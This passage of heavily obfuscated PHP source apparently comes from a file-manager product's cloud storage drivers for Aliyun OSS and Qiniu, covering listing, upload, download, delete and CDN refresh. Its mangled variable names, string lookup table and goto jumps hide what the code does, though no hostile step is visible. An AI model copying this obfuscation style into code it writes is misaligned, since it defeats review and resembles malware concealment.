$¹ğçƒ§[1701]; $çÊë¹Éá = array(OSS\OssClient::OSS_SUB_RESOURCE => $¹ğçƒ§[1702] . rawurlencode("{$µôÚÀ‰}\73\146\x69\x6c\145\156\141\x6d\145\x3d{$ìá—¨³}")); $ò¡àˆ±§ = $this->link($áÊæÑ¿—, $çÊë¹Éá); $this->fileOutLink($ò¡àˆ±§); } public function fileOutServer($ã×ò‚šÆ, $ëãáØ¸ğ = false, $ºŸí¶ÊÄ = false, $Û‘û™Èä = '') { parent::fileOut($ã×ò‚šÆ, $ëãáØ¸ğ, $ºŸí¶ÊÄ, $Û‘û™Èä); } public function fileOutImage($˜ÈÒ¥Ã, $ßˆ§˜˜ = 250) { if ($this->size($˜ÈÒ¥Ã) > 1024 * 1024 * 20) { return $this->fileOutImageServer($˜ÈÒ¥Ã, $ßˆ§˜˜); } $Ş‚êİ‘ƒ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[œ—üé‹ê][1665] . $ßˆ§˜˜); $ğÊ§¤‹Ú = $this->link($˜ÈÒ¥Ã, $Ş‚êİ‘ƒ); $this->fileOutLink($ğÊ§¤‹Ú); } public function fileOutImageServer($Õ©ÔÓò¿, $µ·Ÿº£‚ = 250) { parent::fileOutImage($Õ©ÔÓò¿, $µ·Ÿº£‚); } public function fileOutLink($ö³«²úÏ) { $‘İ€½¸ƒ =& $_SERVER[œ—üé‹ê]; if (!$this->isCdnHost() && substr($ö³«²úÏ, 0, 7) == $‘İ€½¸ƒ[216]) { $ö³«²úÏ = $‘İ€½¸ƒ[217] . substr($ö³«²úÏ, 7); } header($‘İ€½¸ƒ[172] . $ö³«²úÏ); die; } public function hashMd5($¬õ›–ßÛ, $Ğ£ÈÄÎ = '') { $«êÊç¡õ =& $_SERVER[œ—üé‹ê]; $ÇØ·­•Ó = $this->_objectMeta($¬õ›–ßÛ); if (!$ÇØ·­•Ó) { return $«êÊç¡õ[12]; } if (!isset($ÇØ·­•Ó[$«êÊç¡õ[1685]]) && !empty($Ğ£ÈÄÎ)) { $å…Šä = $this->updateObjMeta($¬õ›–ßÛ, array($«êÊç¡õ[1685] => $Ğ£ÈÄÎ)); $ÇØ·­•Ó[$«êÊç¡õ[1685]] = $å…Šä ? $Ğ£ÈÄÎ : $«êÊç¡õ[12]; } return isset($ÇØ·­•Ó[$«êÊç¡õ[1685]]) ? strtolower($ÇØ·­•Ó[$«êÊç¡õ[1685]]) : $«êÊç¡õ[12]; } public function size($–ÚšÍÆ“) { $¤±³‚ = $this->objectMeta($–ÚšÍÆ“); return $¤±³‚ ? $¤±³‚[$_SERVER[œ—üé‹ê][79]] : 0; } public function info($í¦Ô³—®) { if ($this->isFolder($í¦Ô³—®)) { return $this->folderInfo($í¦Ô³—®); } else { if ($this->isFile($í¦Ô³—®)) { return $this->fileInfo($í¦Ô³—®); } } return !1; } public function exist($’€›©§´) { return $this->isFile($’€›©§´) || $this->isFolder($’€›©§´); } public function isFile($ãÓñÄæ™) { return !$this->isFolder($ãÓñÄæ™) && $this->objectMeta($ãÓñÄæ™); } public function isFolder($’²•üÔ) { return $this->cacheMethod($_SERVER[œ—üé‹ê][177], $’²•üÔ); } protected function objectMeta($ƒš¹µ¹‘) { return $this->cacheMethod($_SERVER[œ—üé‹ê][179], $ƒš¹µ¹‘); } protected function _objectMeta($¢×‰Ãåî) { $Ô¿˜”’ =& $_SERVER[œ—üé‹ê]; try { $‘§›ƒàô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¢×‰Ãåî)); } catch (OSS\Core\OssException $¢•Üƒ™½) { $this->writeLog(__FUNCTION__ . $Ô¿˜”’[212] . $¢•Üƒ™½->getMessage()); $‘§›ƒàô = !1; } if ($‘§›ƒàô) { $‘§›ƒàô[$Ô¿˜”’[79]] = intval($‘§›ƒàô[$Ô¿˜”’[1683]]); } return $‘§›ƒàô; } protected function _isFolder($”§˜£‚¾) { $Ê““Šğß =& $_SERVER[œ—üé‹ê]; if ($”§˜£‚¾ == $Ê““Šğß[12] || $”§˜£‚¾ == $Ê““Šğß[8]) { return !0; } $¾óâç…ù = array($Ê““Šğß[1678] => $Ê““Šğß[8], $Ê““Šğß[1679] => rtrim($”§˜£‚¾, $Ê““Šğß[8]) . $Ê““Šğß[8], $Ê““Šğß[1680] => 1, $Ê““Šğß[1681] => $Ê““Šğß[12]); $¯Î¾ÅÁ“ = $this->client->listObjects($this->bucket, $¾óâç…ù); if ($¯Î¾ÅÁ“->getObjectList() || $¯Î¾ÅÁ“->getPrefixList()) { return !0; } return !1; } public function writeLog($¯Şá÷›Ù = '', $îÀûå£Î = false) { $İÂÔ…ô¥ =& $_SERVER[œ—üé‹ê]; $Ã³ÔéÊ” = in_array(ACTION, array($İÂÔ…ô¥[210], $İÂÔ…ô¥[211])); if (!$Ã³ÔéÊ” && !GLOBAL_DEBUG) { return; } $ì–Õ•ù = 0; if (stripos($¯Şá÷›Ù, $İÂÔ…ô¥[1703]) !== !1) { $ì–Õ•ù = 1; $Î¬î„£æ = explode($İÂÔ…ô¥[1704], $¯Şá÷›Ù); $¯Şá÷›Ù = !empty($Î¬î„£æ[1]) ? $Î¬î„£æ[1] : $¯Şá÷›Ù; } else { if (stripos($¯Şá÷›Ù, $İÂÔ…ô¥[1705])) { $ì–Õ•ù = 2; $Î¬î„£æ = explode($İÂÔ…ô¥[1705], $¯Şá÷›Ù); $Î¬î„£æ = explode($İÂÔ…ô¥[4], $Î¬î„£æ[0]); $¯Şá÷›Ù = !empty($Î¬î„£æ[1]) ? $Î¬î„£æ[1] : $¯Şá÷›Ù; } } if ($Ã³ÔéÊ” && I18n::getType() == $İÂÔ…ô¥[1706]) { if ($ì–Õ•ù == 1) { $¯Şá÷›Ù = str_replace($İÂÔ…ô¥[1707], $İÂÔ…ô¥[1708], $¯Şá÷›Ù); } else { if ($ì–Õ•ù == 2) { $Î¬î„£æ = explode($İÂÔ…ô¥[212], $Î¬î„£æ[0]); $“áİÌˆà = isset($Î¬î„£æ[1]) ? $Î¬î„£æ[1] : $İÂÔ…ô¥[12]; $×¢«Û¡— = array($İÂÔ…ô¥[1709] => $İÂÔ…ô¥[1710], $İÂÔ…ô¥[1711] => $İÂÔ…ô¥[1712], $İÂÔ…ô¥[1713] => $İÂÔ…ô¥[1714], $İÂÔ…ô¥[1715] => $İÂÔ…ô¥[1716], $İÂÔ…ô¥[1717] => $İÂÔ…ô¥[1718], $İÂÔ…ô¥[1719] => $İÂÔ…ô¥[1720], $İÂÔ…ô¥[1721] => $İÂÔ…ô¥[1722], $İÂÔ…ô¥[1723] => $İÂÔ…ô¥[1724], $İÂÔ…ô¥[1725] => $İÂÔ…ô¥[1726], $İÂÔ…ô¥[1727] => $İÂÔ…ô¥[1728]); if (isset($×¢«Û¡—[$“áİÌˆà])) { $¯Şá÷›Ù = $×¢«Û¡—[$“áİÌˆà]; } } } if (stripos($¯Şá÷›Ù, $İÂÔ…ô¥[1729])) { $¯Şá÷›Ù = $İÂÔ…ô¥[1730]; } } if (!trim($¯Şá÷›Ù)) { return; } parent::writeLog(trim($¯Şá÷›Ù), $îÀûå£Î); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($×üóÒ») { parent::__construct(); require_once SDK_DIR . $_SERVER[œ—üé‹ê][1731]; $this->_init($×üóÒ»); } public function _init($ã™ïº«) { $ÈŒ¶Ş¬Ğ =& $_SERVER[œ—üé‹ê]; $this->config = $ã™ïº«; foreach ($ã™ïº« as $³ÜÏè” => $œæĞƒà) { if (isset($this->{$³ÜÏè”})) { $this->{$³ÜÏè”} = $œæĞƒà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÈŒ¶Ş¬Ğ[1732] . LNG($ÈŒ¶Ş¬Ğ[1669])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($µÔ‚í³¿, $³…Èê†Ø = '', $şäÃÒ² = REPEAT_RENAME) { if ($this->setContent($µÔ‚í³¿, $³…Èê†Ø)) { return $this->getPathOuter($µÔ‚í³¿); } return !1; } public function mkdir($¡„¼ÇÍÒ, $îÎú¤øø = REPEAT_SKIP) { $±˜è¢äğ =& $_SERVER[œ—üé‹ê]; $š¢ƒ¦²• = trim($¡„¼ÇÍÒ, $±˜è¢äğ[8]); if ($this->_isFolder($š¢ƒ¦²•)) { return $this->getPathOuter($š¢ƒ¦²•); } $¡„¼ÇÍÒ = $š¢ƒ¦²• . $±˜è¢äğ[8]; $îÂŸÓø = get_path_this($š¢ƒ¦²•); $êØ˜œÓ¸ = $¡„¼ÇÍÒ . $îÂŸÓø; if (!$this->mkfile($êØ˜œÓ¸)) { return !1; } if (!$this->moveFile($êØ˜œÓ¸, $¡„¼ÇÍÒ)) { $this->delFile($êØ˜œÓ¸); return !1; } return $this->getPathOuter($š¢ƒ¦²•); } public function copyFile($Ó“Ÿ’ëŸ, $ñÍ”ò÷) { $À·¤ç°¨ = $this->bucketManager->copy($this->bucket, $Ó“Ÿ’ëŸ, $this->bucket, $ñÍ”ò÷, !0); return $À·¤ç°¨ ? !1 : $this->getPathOuter($ñÍ”ò÷); } public function moveFile($Œ‘–ó€£, $²ˆÙçë) { $éÍçœ¬é = $this->bucketManager->move($this->bucket, $Œ‘–ó€£, $this->bucket, $²ˆÙçë, !0); return $éÍçœ¬é ? !1 : $this->getPathOuter($²ˆÙçë); } public function delFile($ĞúÅÔ¼ñ) { if (!$this->exist($ĞúÅÔ¼ñ)) { return !0; } $ßËğ‚Í = $this->bucketManager->delete($this->bucket, $ĞúÅÔ¼ñ); if (!$ßËğ‚Í) { return !0; } return $ßËğ‚Í->code() == 612 ? !0 : !1; } public function delFolder($òöÌÜ¡–) { $ŸÍÅ™â¸ =& $_SERVER[œ—üé‹ê]; if (!$this->exist($òöÌÜ¡–)) { return !0; } $this->listItemCache = !1; $éÖŒÒÒ° = $this->fileList($òöÌÜ¡–); $this->listItemCache = !0; $¢”Æå›Ÿ = trim($òöÌÜ¡–, $ŸÍÅ™â¸[8]) . $ŸÍÅ™â¸[8]; if (!empty($òöÌÜ¡–) && $òöÌÜ¡– !== $ŸÍÅ™â¸[228] && !in_array($¢”Æå›Ÿ, $éÖŒÒÒ°[$ŸÍÅ™â¸[85]])) { $éÖŒÒÒ°[$ŸÍÅ™â¸[85]][] = $¢”Æå›Ÿ; } $¥–õôÏß = $this->delByBatch($éÖŒÒÒ°[$ŸÍÅ™â¸[86]]); if (!$¥–õôÏß) { return !1; } $¥–õôÏß = $this->delByBatch($éÖŒÒÒ°[$ŸÍÅ™â¸[85]]); if (!$¥–õôÏß) { return !1; } return $this->delFile($¢”Æå›Ÿ); } private function delByBatch($Àˆåß¼) { foreach (array_chunk($Àˆåß¼, 1000) as $¦¹«–¼ª) { $ØÂ½«‰ = $this->bucketManager->buildBatchDelete($this->bucket, $¦¹«–¼ª); list($÷–ô‘ÙÎ, $ŠÕø»Ş‡) = $this->bucketManager->batch($ØÂ½«‰); if ($ŠÕø»Ş‡) { return !1; } } return !0; } public function rename($ş—àùŞ½, $è¼«ÀøÒ) { return $this->renameObject($ş—àùŞ½, $è¼«ÀøÒ); } public function fileInfo($·êÛ÷Ë§, $·“óí´ = false, $ ç‘âáˆ = array()) { $İÊ¤€ûà =& $_SERVER[œ—üé‹ê]; $úìŞÙ½à = array($İÊ¤€ûà[32] => $this->pathThis($·êÛ÷Ë§), $İÊ¤€ûà[87] => $this->getPathOuter($İÊ¤€ûà[8] . $·êÛ÷Ë§), $İÊ¤€ûà[33] => $İÊ¤€ûà[230], $İÊ¤€ûà[79] => isset($ ç‘âáˆ[$İÊ¤€ûà[1733]]) ? $ ç‘âáˆ[$İÊ¤€ûà[1733]] : 0, $İÊ¤€ûà[166] => $this->ext($·êÛ÷Ë§)); if ($·“óí´) { return $úìŞÙ½à; } $úìŞÙ½à[$İÊ¤€ûà[231]] = $úìŞÙ½à[$İÊ¤€ûà[88]] = 0; $úìŞÙ½à[$İÊ¤€ûà[232]] = $úìŞÙ½à[$İÊ¤€ûà[233]] = !0; if (empty($ ç‘âáˆ)) { $ ç‘âáˆ = $this->objectMeta($·êÛ÷Ë§); if (!$ ç‘âáˆ) { return $úìŞÙ½à; } } if (isset($ ç‘âáˆ[$İÊ¤€ûà[234]]) && $ ç‘âáˆ[$İÊ¤€ûà[234]]) { $úìŞÙ½à[$İÊ¤€ûà[235]] = $ ç‘âáˆ[$İÊ¤€ûà[234]]; } if (isset($ ç‘âáˆ[$İÊ¤€ûà[245]]) && $ ç‘âáˆ[$İÊ¤€ûà[245]]) { $úìŞÙ½à[$İÊ¤€ûà[235]] = $ ç‘âáˆ[$İÊ¤€ûà[245]]; } if (isset($ ç‘âáˆ[$İÊ¤€ûà[1734]])) { $úìŞÙ½à[$İÊ¤€ûà[88]] = substr($ ç‘âáˆ[$İÊ¤€ûà[1734]] . $İÊ¤€ûà[12], 0, 10); } if (isset($ ç‘âáˆ[$İÊ¤€ûà[1733]])) { $úìŞÙ½à[$İÊ¤€ûà[79]] = $ ç‘âáˆ[$İÊ¤€ûà[1733]]; } return $úìŞÙ½à; } public function folderInfo($’ù´ğÕÂ, $ÒÜ¢™Í = false) { $ìæ©„¸æ =& $_SERVER[œ—üé‹ê]; $ÑìöØ’  = array($ìæ©„¸æ[32] => $this->pathThis($’ù´ğÕÂ), $ìæ©„¸æ[87] => $this->getPathOuter($ìæ©„¸æ[8] . $’ù´ğÕÂ), $ìæ©„¸æ[33] => $ìæ©„¸æ[78]); if ($ÒÜ¢™Í) { return $ÑìöØ’ ; } $ÑìöØ’ [$ìæ©„¸æ[231]] = $ÑìöØ’ [$ìæ©„¸æ[88]] = 0; $ÑìöØ’ [$ìæ©„¸æ[232]] = $ÑìöØ’ [$ìæ©„¸æ[233]] = !0; $’ù´ğÕÂ = rtrim($’ù´ğÕÂ, $ìæ©„¸æ[8]) . $ìæ©„¸æ[8]; $ø÷®ÙíÂ = $this->objectMeta($’ù´ğÕÂ); if (isset($ø÷®ÙíÂ[$ìæ©„¸æ[1734]])) { $ÑìöØ’ [$ìæ©„¸æ[88]] = substr($ø÷®ÙíÂ[$ìæ©„¸æ[1734]] . $ìæ©„¸æ[12], 0, 10); } return $ÑìöØ’ ; } public function listPath($çËò™Âä, $ìæ‘ÊÖ = false) { $Æõî·‘ï =& $_SERVER[œ—üé‹ê]; $£ƒû”‚© = $this->fileList($çËò™Âä, $Æõî·‘ï[8], !0); foreach ($£ƒû”‚©[$Æõî·‘ï[85]] as $êàÈ¤åø => $äÅ”Ûôº) { $£ƒû”‚©[$Æõî·‘ï[85]][$êàÈ¤åø] = $this->folderInfo($äÅ”Ûôº, $ìæ‘ÊÖ); } foreach ($£ƒû”‚©[$Æõî·‘ï[86]] as $êàÈ¤åø => $äÅ”Ûôº) { $£ƒû”‚©[$Æõî·‘ï[86]][$êàÈ¤åø] = $this->fileInfo($äÅ”Ûôº[$Æõî·‘ï[32]], $ìæ‘ÊÖ, $äÅ”Ûôº); } return $£ƒû”‚©; } public function has($Ã©û¼Ş, $ÖŞ’ğ½º = false, $ë­ÉÌÕï = true) { $îĞøÁ¨ =& $_SERVER[œ—üé‹ê]; $Ã©û¼Ş = trim($Ã©û¼Ş, $îĞøÁ¨[8]); $Ó×¿ßÃ½ = empty($Ã©û¼Ş) && $Ã©û¼Ş !== $îĞøÁ¨[228] ? $îĞøÁ¨[12] : $Ã©û¼Ş . $îĞøÁ¨[8]; $àşÚÀ—‹ = $îĞøÁ¨[12]; $¾¼¶¾ = 500; $å‚ï¨ = $îĞøÁ¨[8]; $¹±ë³™¤ = $Ì­êœÙô = 0; while (!0) { check_abort(); list($¾¿öé˜õ, $Š¼©Í“ƒ) = $this->bucketManager->listFiles($this->bucket, $Ó×¿ßÃ½, $àşÚÀ—‹, $¾¼¶¾, $å‚ï¨); if ($Š¼©Í“ƒ) { break; } $àşÚÀ—‹ = array_key_exists($îĞøÁ¨[1681], $¾¿öé˜õ) ? $àşÚÀ—‹ = $¾¿öé˜õ[$îĞøÁ¨[1735]] : $îĞøÁ¨[12]; if ($ÖŞ’ğ½º) { if (!empty($¾¿öé˜õ[$îĞøÁ¨[1736]])) { $¹±ë³™¤ += count($¾¿öé˜õ[$îĞøÁ¨[1736]]); } if (!empty($¾¿öé˜õ[$îĞøÁ¨[1737]])) { $Ì­êœÙô += count($¾¿öé˜õ[$îĞøÁ¨[1737]]); } if ($àşÚÀ—‹ === $îĞøÁ¨[12]) { break; } continue; } if ($ë­ÉÌÕï) { if (!empty($¾¿öé˜õ[$îĞøÁ¨[1736]])) { return !0; } } else { if (!empty($¾¿öé˜õ[$îĞøÁ¨[1737]])) { return !0; } } if ($àşÚÀ—‹ === $îĞøÁ¨[12]) { break; } } if ($ÖŞ’ğ½º) { return array($îĞøÁ¨[239] => $¹±ë³™¤, $îĞøÁ¨[240] => $Ì­êœÙô); } return !1; } public function listAll($’ÈüÓÆá) { $áô·¡»‡ =& $_SERVER[œ—üé‹ê]; $éòæÕËŒ = $this->fileList($’ÈüÓÆá, $áô·¡»‡[12], !0); $Ÿ¬Û½ùÒ = array_to_keyvalue($éòæÕËŒ[$áô·¡»‡[86]], $áô·¡»‡[32]); foreach ($éòæÕËŒ[$áô·¡»‡[85]] as $à¦˜´Èæ) { if (is_string($à¦˜´Èæ)) { $Ÿ¬Û½ùÒ[$à¦˜´Èæ] = array($áô·¡»‡[79] => 0); } } return $this->listAllFiles($’ÈüÓÆá, $Ÿ¬Û½ùÒ); } private function fileList($×ÄÀÑ«¿, $åÏÅ“‡ = '', $ôªİ‹ü˜ = 0) { $¿Û¦ô§± =& $_SERVER[œ—üé‹ê]; $×ÄÀÑ«¿ = trim($×ÄÀÑ«¿, $¿Û¦ô§±[8]); $§ù¶‹ƒµ = empty($×ÄÀÑ«¿) && $×ÄÀÑ«¿ !== $¿Û¦ô§±[228] ? $¿Û¦ô§±[12] : $×ÄÀÑ«¿ . $¿Û¦ô§±[8]; $¬Óúêëû = $¿Û¦ô§±[12]; $ĞØ˜¢¸‘ = 1000; $å¼›şÌ = $í‹ùä“¸ = array(); while (!0) { check_abort(); list($œÓ˜ŞÕ, $“Ú‚¿ÔÎ) = $this->bucketManager->listFiles($this->bucket, $§ù¶‹ƒµ, $¬Óúêëû, $ĞØ˜¢¸‘, $åÏÅ“‡); if ($“Ú‚¿ÔÎ) { break; } $¬Óúêëû = array_key_exists($¿Û¦ô§±[1681], $œÓ˜ŞÕ) ? $¬Óúêëû = $œÓ˜ŞÕ[$¿Û¦ô§±[1735]] : $¿Û¦ô§±[12]; $·ô§ÍÂ = isset($œÓ˜ŞÕ[$¿Û¦ô§±[1736]]) ? $œÓ˜ŞÕ[$¿Û¦ô§±[1736]] : array(); $åûÈİ„ = isset($œÓ˜ŞÕ[$¿Û¦ô§±[1737]]) ? $œÓ˜ŞÕ[$¿Û¦ô§±[1737]] : array(); foreach ($·ô§ÍÂ as $Ù° ±‚ñ) { if ($Ù° ±‚ñ[$¿Û¦ô§±[95]] == $§ù¶‹ƒµ) { continue; } $ô°šëª = $Ù° ±‚ñ[$¿Û¦ô§±[95]]; $ÉƒƒÓû² = $Ù° ±‚ñ[$¿Û¦ô§±[1733]]; $Ù° ±‚ñ[$¿Û¦ô§±[32]] = $ô°šëª; $Ù° ±‚ñ[$¿Û¦ô§±[79]] = $ÉƒƒÓû²; $Ø×óôú÷ = $ÉƒƒÓû² == 0 && substr($ô°šëª, strlen($ô°šëª) - 1, 1) == $¿Û¦ô§±[8] ? !0 : !1; $this->cacheMethodInfoSet($ô°šëª, $Ø×óôú÷, $Ù° ±‚ñ); if ($Ø×óôú÷) { $å¼›şÌ[] = $ô°šëª; continue; } $í‹ùä“¸[] = $ôªİ‹ü˜ ? $Ù° ±‚ñ : $ô°šëª; } foreach ($åûÈİ„ as $ô°šëª) { if ($ô°šëª == $§ù¶‹ƒµ) { continue; } $å¼›şÌ[] = $ô°šëª; $this->cacheMethodInfoSet($ô°šëª, !0); } if ($¬Óúêëû === $¿Û¦ô§±[12]) { break; } } $this->cacheMethodInfoSet($×ÄÀÑ«¿, !0); return array($¿Û¦ô§±[85] => $å¼›şÌ, $¿Û¦ô§±[86] => $í‹ùä“¸); } public function canRead($°Ñ´Çø³) { return $this->exist($°Ñ´Çø³) ? !0 : !1; } public function canWrite($àÔİ¶ñ¬) { return $this->exist($àÔİ¶ñ¬) ? !0 : !1; } public function getContent($Ú×·Á ) { return $this->fileSubstr($Ú×·Á , 0, -1); } public function setContent($İàÆ¶ö, $éÈÙõ¿ó = '') { $ëÔĞˆĞ¨ = $this->tempFile($this->pathThis($İàÆ¶ö)); file_put_contents($ëÔĞˆĞ¨, $éÈÙõ¿ó); if ($this->upload($İàÆ¶ö, $ëÔĞˆĞ¨)) { $this->tempFileRemve($ëÔĞˆĞ¨); return !0; } return !1; } public function refreshUrls($»ÊÀßÌÅ) { $°´š€Ë¢ =& $_SERVER[œ—üé‹ê]; $¶Ó‹§Û = array(); if (is_array($»ÊÀßÌÅ)) { foreach ($»ÊÀßÌÅ as $‘³¶Õ¿) { $¶Ó‹§Û[] = $this->link($‘³¶Õ¿); } } else { $¶Ó‹§Û[] = $this->link($»ÊÀßÌÅ); } $µØÒÂÁõ = new Qiniu\Cdn\CdnManager($this->auth); list($Ô¦ò„“Å, $½€–æÀÈ) = $µØÒÂÁõ->refreshUrls($¶Ó‹§Û); if ($½€–æÀÈ) { return !1; } return $Ô¦ò„“Å[$°´š€Ë¢[1367]] == $°´š€Ë¢[869] ? !0 : !1; } public function fileSubstr($ñëü·û, $Ù¹—ÌõŠ, $ ¼›¿Ë) { $ã¹Æñ±¹ =& $_SERVER[œ—üé‹ê]; if (!($¤ãá±Ï£ = $this->link($ñëü·û))) { return !1; } $áâ»‚Â = !1; if ($ ¼›¿Ë > 0) { $ëçÀ­õ = $Ù¹—ÌõŠ + $ ¼›¿Ë - 1; $áâ»‚Â = array($ã¹Æñ±¹[1601] . $Ù¹—ÌõŠ . $ã¹Æñ±¹[476] . $ëçÀ­õ); } $§Ğ–‹¨® = url_request($¤ãá±Ï£, $ã¹Æñ±¹[1602], !1, $áâ»‚Â); return $§Ğ–‹¨®[$ã¹Æñ±¹[859]] ? $§Ğ–‹¨®[$ã¹Æñ±¹[1388]] : !1; } public function upload($çü×ø˜ş, $¨’ Òù“, $¢²ŞÌ¼Ã = false, $ôİ³Æ¿² = REPEAT_REPLACE) { if (!$¨’ Òù“ || !@file_exists($¨’ Òù“)) { return !1; } $ˆŸì‚À = new Qiniu\Storage\UploadManager(); $ÅÁï·°ü = $this->auth->uploadToken($this->bucket, $çü×ø˜ş); $òœÍ‰ñé = get_file_mime(get_path_ext($¨’ Òù“)); list($éç¶¼Ñ‹, $–í–¥é±) = $ˆŸì‚À->putFile($ÅÁï·°ü, $çü×ø˜ş, $¨’ Òù“, null, $òœÍ‰ñé); return $–í–¥é± ? !1 : $this->getPathOuter($çü×ø˜ş); } public function uploadFormData($ƒ··ß¸, $ Èç­ß = 3600) { return $this->uploadToken($ƒ··ß¸, $ Èç­ß); } public function uploadMultiData($é¹ùòöÃ, $õû¨Áğ  = 3600) { return $this->uploadToken($é¹ùòöÃ, $õû¨Áğ ); } private function uploadToken($çá˜€ß, $ı€ıæ¼¹ = 3600) { $¬±İÔÍ¼ =& $_SERVER[œ—üé‹ê]; $Ù¤ôœ® = $ı€ıæ¼¹; $˜ ñó¤‰ = array($¬±İÔÍ¼[1738] => $¬±İÔÍ¼[1739]); $Ó¿âıÓÄ = $çá˜€ß; $á¹éÙ‹© = $this->auth->uploadToken($this->bucket, $Ó¿âıÓÄ, $Ù¤ôœ®, $˜ ñó¤‰, !0); $ïÕÜû£× = empty($this->region) || $this->region == $¬±İÔÍ¼[1740] ? $¬±İÔÍ¼[12] : $¬±İÔÍ¼[476] . $this->region; $ˆÁïó™é = http_type() . "\72\57\x2f\x75\160\154\x6f\x61\x64{$ïÕÜû£×}\56\x71\151\156\x69\x75\160\56\143\157\155\x2f"; return array($¬±İÔÍ¼[1741] => $á¹éÙ‹©, $¬±İÔÍ¼[1604] => $ˆÁïó™é); } public function download($ö¡åŒÈ, $§„‰ÄŸ) { $ô†äç¶Ó = IO::getPathInner(IO::mkfile($§„‰ÄŸ)); if (!($¶òôÂ˜ì = $this->link($ö¡åŒÈ))) { return !1; } $ß†¼‡·İ = 0; $¥Œ¸œàÃ = 1024 * 200; $ˆÓ¨©úŒ = fopen($ô†äç¶Ó, $_SERVER[œ—üé‹ê][1742]); while (!0) { $ÓÌ€æ° = $this->fileSubstr($ö¡åŒÈ, $ß†¼‡·İ, $¥Œ¸œàÃ); if ($ÓÌ€æ° === !1) { return !1; } fwrite($ˆÓ¨©úŒ, $ÓÌ€æ°); $ß†¼‡·İ += $¥Œ¸œàÃ; if (strlen($ÓÌ€æ°) < $¥Œ¸œàÃ) { break; } } fclose($ˆÓ¨©úŒ); return $§„‰ÄŸ; } public function link($‹Ï€¢ÇÌ, $Ø¬Ä›ğò = '') { if (!$this->isFile($‹Ï€¢ÇÌ)) { return !1; } $ÒÙŒËé– = $this->getHost() . $_SERVER[œ—üé‹ê][8] . $this->pathEncode($‹Ï€¢ÇÌ) . $Ø¬Ä›ğò; return $this->auth->privateDownloadUrl($ÒÙŒËé–, 3600 * 12); } public function fileOut($ö÷óÀ±, $Â¯ †î = false, $¨“±©©à = false, $ôñíì = '') { $™·øˆÔÄ =& $_SERVER[œ—üé‹ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($ö÷óÀ±, $Â¯ †î, $¨“±©©à, $ôñíì); } if (!$¨“±©©à) { $¨“±©©à = $this->pathThis($ö÷óÀ±); } $®ÎıÁÎù = $Â¯ †î ? $™·øˆÔÄ[1743] . rawurlencode($¨“±©©à) : $™·øˆÔÄ[12]; $íÍº… = $this->link($ö÷óÀ±, $®ÎıÁÎù); $this->fileOutLink($íÍº…); } public function fileOutServer($â„™é×ß, $ÜÙ™™Õ = false, $İ…½ııØ = false, $ö­©µè¼ = '') { parent::fileOut($â„™é×ß, $ÜÙ™™Õ, $İ…½ııØ, $ö­©µè¼); } public function fileOutImage($¡íÓËı, $Äıí¶é© = 250) { if ($this->size($¡íÓËı) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡íÓËı, $Äıí¶é©); } $ß­çšÆÄ = $this->link($¡íÓËı, $_SERVER[œ—üé‹ê][1744] . $Äıí¶é©); $this->fileOutLink($ß­çšÆÄ); } public function fileOutImageServer($ï½ÛÌ, $¬ñÛº¡à = 250) { parent::fileOutImage($ï½ÛÌ, $¬ñÛº¡à); } public function hashMd5($ÆÕ¢ÖÓ©) { $â¿ÎéíÀ =& $_SERVER[œ—üé‹ê]; $á ØÛí¹ = $this->objectMeta($ÆÕ¢ÖÓ©); return isset($á ØÛí¹[$â¿ÎéíÀ[245]]) ? $á ØÛí¹[$â¿ÎéíÀ[245]] : !1; $ô§å‹‚÷ = $this->link($ÆÕ¢ÖÓ©, $â¿ÎéíÀ[1745]); } public function size($á¹°º¯õ) { $å³è = $this->objectMeta($á¹°º¯õ); return $å³è ? $å³è[$_SERVER[œ—üé‹ê][79]] : 0; } public function info($Œˆß‘ÏÍ) { if ($this->isFolder($Œˆß‘ÏÍ)) { return $this->folderInfo($Œˆß‘ÏÍ); } else { if ($this->isFile($Œˆß‘ÏÍ)) { return $this->fileInfo($Œˆß‘ÏÍ); } } return !1; } public function exist($Ì¥ñÚß­) { return $this->isFile($Ì¥ñÚß­) || $this->isFolder($Ì¥ñÚß­); } public function isFile($±ËÀú´•) { return !$this->isFolder($±ËÀú´•) && $this->objectMeta($±ËÀú´•); } public function isFolder($®Ÿ–ß×û) { return $this->cacheMethod($_SERVER[œ—üé‹ê][177], $®Ÿ–ß×û); } protected function objectMeta($Ÿş¸¿İË) { return $this->cacheMethod($_SERVER[œ—üé‹ê][179], $Ÿş¸¿İË); } protected function _objectMeta($±»…Ùî¾) { $Ç¾¯˜Òè =& $_SERVER[œ—üé‹ê]; list($„Ç¤İ²ª, $ºŸÏ§íˆ) = $this->bucketManager->stat($this->bucket, $±»…Ùî¾); if ($„Ç¤İ²ª) { $„Ç¤İ²ª[$Ç¾¯˜Òè[79]] = intval($„Ç¤İ²ª[$Ç¾¯˜Òè[1733]]); } return $„Ç¤İ²ª; } protected function _isFolder($û×ïëÃƒ) { $ÔÁõäù =& $_SERVER[œ—üé‹ê]; if ($û×ïëÃƒ == $ÔÁõäù[12] || $û×ïëÃƒ == $ÔÁõäù[8]) { return !0; } list($õ¡ãò²š, $°«½Ş„æ) = $this->bucketManager->listFiles($this->bucket, trim($û×ïëÃƒ, $ÔÁõäù[8]) . $ÔÁõäù[8], $ÔÁõäù[12], 1, $ÔÁõäù[8]); return !empty($õ¡ãò²š[$ÔÁõäù[1736]]) || !empty($õ¡ãò²š[$ÔÁõäù[1737]]) ? !0 : !1; } } goto DÊ’Ş‚îí; Eö‘±œŒ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($à¢¸ó‚³ = false, $Ô‚°Äü = "\x6d\157\x64\x69\146\x79\124\x69\x6d\x65", $ú·¿™è = false) { $Ã³œ¶ä® =& $_SERVER[œ—üé‹ê]; 